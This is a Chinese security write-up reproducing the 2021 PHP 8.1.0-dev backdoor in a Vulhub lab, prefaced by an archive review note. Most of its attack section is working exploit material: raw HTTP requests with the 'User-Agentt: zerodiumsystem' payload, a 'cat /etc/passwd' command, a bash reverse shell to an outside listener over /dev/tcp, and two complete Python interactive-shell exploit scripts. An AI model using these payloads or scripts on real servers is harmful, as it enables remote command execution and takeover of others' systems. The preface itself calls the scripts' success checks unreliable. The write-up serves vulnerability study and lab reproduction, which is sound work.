---
source: "MrWQ/vulnerability-paper"
product: "PHP/2021开发分支恶意提交"
record_type: "incident"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PHP 8-1-0-dev 后门远程命令执行漏洞复现"
prerequisites: "来源所述条件，未列明部分仍待核：仅特定被篡改8.1.0-dev构建，不是全部同版本字符串或正式发布"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/bgIzJfT_wcSuxwjtFBjhhQ"
id: "vw-47d5c84ae8c3c0ea74054437"
entity_id: "ve-47d5c84ae8c3c0ea74054437"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅特定被篡改8.1.0-dev构建，不是全部同版本字符串或正式发布

代码与实验材料：两完整交互脚本及HTTP，脚本200即宣称shell/仅X-Powered-By即判断，均不可靠；含外连和真实样式Cookie

来源证据范围：PHP internals公告和Vulhub，来源较好

- **事实待核（1）**：版本号等同后门证据；依据：简介称8.1.0-dev与后门一起发布；脚本用HTTP200或版本头当成功，不能确认恶意提交存在。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **来源与引用处置（2）**：示例凭据和脚本健壮性问题；依据：无关ADMINCONSOLESESSION/JSESSIONID完整保留；缺头抛异常被当不易受攻击，命令引号未经处理。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

- **事实待核（3）**：修复不应只笼统安装补丁；依据：供应链事件需可信来源重建和提交核对，而非仅版本字符串升级。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PHP 8-1-0-dev 后门远程命令执行漏洞复现

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bgIzJfT_wcSuxwjtFBjhhQ)

**上方蓝色字体关注我们，一起学安全！**

**作者：****Pet3r****@Timeline Sec  
**

**本文字数：1465**

**阅读时长：3～4min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

PHP verion 8.1.0-dev 于 2021 年 3 月 28 日与后门一起发布，但是后门很快被发现并删除。  

**0x02 漏洞概述**  

  

PHP verion 8.1.0-dev 的 PHP 在服务器上运行，则攻击者可以通过发送 **User-Agentt** 标头执行任意代码。  

**0x03 影响版本**  

  

PHP 8.1.0-dev

**0x04 环境搭建**  

  

使用 vulhub 进行搭建：  

```
cd vulhub/php/8.1-backdoor
sudo docker-compose up -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCH9wW40HrjXFUbJicDowtsgRJkdIf1pGq4lhwVbAm8lJ9m3q8084ciakrg/640?wx_fmt=png)

访问主页  

```
http://192.168.40.140:8080/
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHBZnr2ibViaADL8LGGjGfXD4209jVcNESiaL0Eu77OwAEhdl6uJ3eyAD1Q/640?wx_fmt=png)  
  

**0x05 漏洞复现**  

  

**1、POC 验证**  

```
GET / HTTP/1.1
Host: 192.168.40.140:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
User-Agentt: zerodiumvar_dump(2*3); //或者User-Agentt: zerodiumsystem("cat /etc/passwd");
Upgrade-Insecure-Requests: 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHyI2k95vdpEcF6FRzvos0wAuNLUGawREQtKTUc4GfNuFFjbO1mv1ia8Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHGLsmf45GiaKqaNb1NdynFiclWjRt1PN1R96jicgpPrpBJDfZPkPwNArtw/640?wx_fmt=png)

```
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't access tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

**2、反弹 shell 或执行 exp**  

```
GET / HTTP/1.1
Host: 192.168.40.140:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ADMINCONSOLESESSION=LBY**********************************************************974; JSESSIONID=0B0**************************2FF
User-Agentt: zerodiumsystem("bash -c 'exec bash -i >& /dev/tcp/192.168.40.129/6666 0>&1'");
Upgrade-Insecure-Requests: 1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHpyOEEBlS1dseBu0xGbqu2NIyjKDHVlFzXHeCe0MVktyic6J22wKNoxw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHsfINHFicQTHqILcoIVpAoYicJu4wHhKOUOuXsWiaNcrDgnEibprDQv3DNA/640?wx_fmt=png)  

EXP：

```
import argparse, textwrap
import requests
import sys
 
 
parser = argparse.ArgumentParser(description="PHP 8.1.0-dev WebShell RCE", formatter_class=argparse.RawTextHelpFormatter,
epilog=textwrap.dedent('''
Exploit Usage :
./exploit.py -l http://127.0.0.1
[^] WebShell= id
OR
[^] WebShell= whoami
'''))                    
 
parser.add_argument("-l","--url", help="PHP 8.1.0-dev Target URL(Example: http://127.0.0.1)")
args = parser.parse_args()
 
if len(sys.argv) <= 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url]")         
    sys.exit() 
 
# Variables
Host = args.url
 
r = requests.session()
 
## Use this for Proxy
#r.proxies.update( { 'http':'http://127.0.0.1:8080' } )
 
def svcheck():
    verify = r.get(f'{Host}')
 
    if (verify.headers['X-Powered-By'] == 'PHP/8.1.0-dev') :
        print("Target is running on PHP 8.1.0-dev\n")
        return True
 
def exec():
    headerscontent = {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'User-Agentt' : f'zerodiumsystem("{Command}");'
                     }
  
    door = r.get(f'{Host}', headers = headerscontent, allow_redirects= False)
 
    resp = door.text.split("<!DOCTYPE html>")[0]
    if (resp == ""):
        print()
        print("Invalid Command")
        print()  
    else:
        print()
        print(resp)
 
 
if __name__ == "__main__":
 
    print ('\n[+] PHP 8.1.0-dev WebShell RCE \n ')
    try:   
        if svcheck() == True:
            print("*Type the command* \n")
            try:
                while True:
                    Command = input("[^] WebShell= ")
                    exec()
            except:
                print("\r\nExiting.")
                sys.exit(-1)
     
    except Exception as ex:
        print('Invalid URL or Target not Vulnerable')
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHZPacPsDLu3pxlTqLspsLhHJWIfmNQ3cDQfaNpt58Zgsia5CXGkpFnuA/640?wx_fmt=png)  

**0x06 修复方式**  

  

建议参考官方公告及时升级或安装相应补丁。

**参考链接：**

https://news-web.php.net/php.internals/113838

https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor

https://www.php.net/

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
